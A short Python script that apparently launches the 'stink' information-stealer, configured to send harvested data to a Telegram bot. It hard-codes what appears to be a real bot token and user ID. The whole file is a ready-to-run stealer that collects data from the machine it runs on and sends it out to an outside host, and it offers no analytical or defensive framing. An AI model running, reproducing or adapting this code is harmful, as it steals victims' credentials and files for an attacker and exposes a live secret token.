from stink.enums.senders import Senders
from stink.multithreading import Stealer, Sender

if __name__ == '__main__':
    Stealer(senders=[Senders.telegram(token="7640963418:AAEjQ0YxL2oqnhhwVC0GNSQANGQFv6Yp7GE", user_id=586901167)]).run()